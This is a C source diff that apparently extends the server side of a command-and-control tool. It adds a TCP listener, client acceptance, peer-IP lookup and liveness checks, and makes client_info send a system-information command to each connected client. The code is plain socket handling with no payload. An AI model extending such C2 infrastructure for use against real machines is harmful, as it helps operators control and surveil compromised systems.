@@ -9,6 +9,8 @@
 #include <limits.h>
 #include "c2.h"
 #include "common.h"
+#include <pthread.h>
+#include <errno.h>
 
 // Bunch of apis used for python gui
 
@@ -57,13 +59,93 @@ sock_t sock_setup() {
     return client_fd;
 }
 
+static sock_t listen_fd = -1;
+
+int start_listen() {
+    if (listen_fd != -1) return 0; // already started
+
+    SOCK_INIT();
+    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (listen_fd < 0) { perror("socket"); return -1; }
+
+    int opt = 1;
+    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    struct sockaddr_in addr = {0};
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons(C2_PORT);
+
+    if (bind(listen_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        perror("bind"); CLOSE_SOCK(listen_fd); listen_fd = -1; return -1;
+    }
+    if (listen(listen_fd, 10) < 0) { perror("listen"); CLOSE_SOCK(listen_fd); listen_fd = -1; return -1; }
+
+    printf("[*] C2 listening on 0.0.0.0:%d (accept mode)\n", C2_PORT);
+    return 0;
+}
+
+int accept_client() {
+    if (listen_fd == -1) {
+        fprintf(stderr, "[ERR] listen socket not initialized\n");
+        return -1;
+    }
+
+    struct sockaddr_in addr = {0};
+    socklen_t addr_len = sizeof(addr);
+    sock_t client_fd = accept(listen_fd, (struct sockaddr*)&addr, &addr_len);
+    if (client_fd < 0) {
+        perror("accept");
+        return -1;
+    }
+    printf("[+] Client connected from %s (fd=%d)\n", inet_ntoa(addr.sin_addr), client_fd);
+    return client_fd;
+}
+
+char* get_peer_ip(sock_t client_fd) {
+    struct sockaddr_in addr = {0};
+    socklen_t len = sizeof(addr);
+    if (getpeername(client_fd, (struct sockaddr*)&addr, &len) < 0) {
+        return NULL;
+    }
+    char *ip = malloc(INET_ADDRSTRLEN);
+    if (!ip) return NULL;
+    strncpy(ip, inet_ntoa(addr.sin_addr), INET_ADDRSTRLEN-1);
+    ip[INET_ADDRSTRLEN-1] = '\0';
+    return ip;
+}
+
+int client_is_alive(sock_t client_fd) {
+    if (client_fd < 0) return 0;
+    char buf;
+    int flags = MSG_PEEK | MSG_DONTWAIT;
+    ssize_t r = recv(client_fd, &buf, 1, flags);
+    if (r == 0) return 0; // orderly shutdown
+    if (r < 0) {
+        if (errno == EAGAIN || errno == EWOULDBLOCK) return 1; // no data but socket alive
+        return 0; // error => treat as closed
+    }
+    return 1; // there is data, socket alive
+}
+
+void stop_listen_and_cleanup() {
+    if (listen_fd != -1) {
+        CLOSE_SOCK(listen_fd);
+        listen_fd = -1;
+    }
+    SHUT_DOWN();
+}
+
 void cleanup(sock_t client_fd) {
     CLOSE_SOCK(client_fd);
     SHUT_DOWN();
 }
 
 char* client_info(sock_t client_fd) {
-    char* client_info = safe_recv(client_fd, NULL, NULL, 0);
+    // Request system info from client and receive the response
+    int dummy = 0;
+    if (safe_send(client_fd, &dummy, SYS_INFO_CMD, sizeof(int), 0) <= 0) return NULL;
+
+    char* client_info = (char*)safe_recv(client_fd, NULL, NULL, 0);
     return client_info;
 }
 
